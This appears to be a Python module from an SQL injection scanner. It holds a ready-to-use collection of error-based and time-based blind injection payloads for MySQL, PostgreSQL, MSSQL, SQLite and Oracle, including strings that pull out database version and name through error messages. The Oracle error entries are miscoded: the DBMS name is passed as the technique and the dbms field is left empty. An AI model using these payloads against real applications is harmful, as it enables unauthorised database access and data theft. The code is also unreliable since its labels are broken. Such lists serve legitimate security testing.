from dataclasses import dataclass
from typing import Optional


@dataclass
class Payload:
    value: str
    technique: str
    dbms: Optional[str] = None
    expected_evidence: Optional[str] = None


ERROR_PAYLOADS: list[Payload] = [
    # MySQL
    Payload("'", "error-based", "mysql"),
    Payload("' OR '1'='1", "error-based", "mysql"),
    Payload("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "error-based", "mysql"),
    Payload("' AND 1=1--", "error-based", "mysql"),
    Payload("' UNION SELECT 1,2,3--", "error-based", "mysql"),
    Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "error-based", "mysql"),
    Payload("' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--", "error-based", "mysql"),
    # PostgreSQL
    Payload("' OR '1'='1", "error-based", "postgresql"),
    Payload("' AND 1=CAST((SELECT version()) AS int)--", "error-based", "postgresql"),
    Payload("1' AND 1=1--", "error-based", "postgresql"),
    Payload("'; SELECT pg_sleep(0)--", "error-based", "postgresql"),
    Payload("' UNION SELECT NULL,NULL--", "error-based", "postgresql"),
    Payload("' AND 1=1; SELECT * FROM pg_sleep(0)--", "error-based", "postgresql"),
    # MSSQL
    Payload("' OR '1'='1", "error-based", "mssql"),
    Payload("1' AND 1=1--", "error-based", "mssql"),
    Payload("'; WAITFOR DELAY '0:0:0'--", "error-based", "mssql"),
    Payload("' UNION SELECT NULL,NULL--", "error-based", "mssql"),
    Payload("' HAVING 1=1--", "error-based", "mssql"),
    Payload("' AND 1=CONVERT(int, @@version)--", "error-based", "mssql"),
    # SQLite
    Payload("' OR '1'='1", "error-based", "sqlite"),
    Payload("' AND 1=1--", "error-based", "sqlite"),
    Payload("' UNION SELECT 1,2,3--", "error-based", "sqlite"),
    Payload("' AND randomblob(0)--", "error-based", "sqlite"),
    # Oracle
    Payload("' OR '1'='1", "oracle"),
    Payload("' AND 1=1--", "oracle"),
    Payload("' UNION SELECT NULL,NULL FROM DUAL--", "oracle"),
    Payload("' AND 1=UTL_INADDR.get_host_name('0')--", "oracle"),
    Payload("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),0)--", "oracle"),
]

TIME_PAYLOADS: list[Payload] = [
    Payload("' OR SLEEP(5)--", "time-based-blind", "mysql"),
    Payload("' OR SLEEP(3)--", "time-based-blind", "mysql"),
    Payload("' AND SLEEP(5)--", "time-based-blind", "mysql"),
    Payload("'; WAITFOR DELAY '0:0:5'--", "time-based-blind", "mssql"),
    Payload("'; WAITFOR DELAY '0:0:3'--", "time-based-blind", "mssql"),
    Payload("' OR pg_sleep(5)--", "time-based-blind", "postgresql"),
    Payload("' OR pg_sleep(3)--", "time-based-blind", "postgresql"),
    Payload("' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),5)--", "time-based-blind", "oracle"),
    Payload("' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),3)--", "time-based-blind", "oracle"),
    Payload("' OR randomblob(500000000)--", "time-based-blind", "sqlite"),
]


def get_error_payloads() -> list[Payload]:
    return ERROR_PAYLOADS


def get_time_payloads() -> list[Payload]:
    return TIME_PAYLOADS
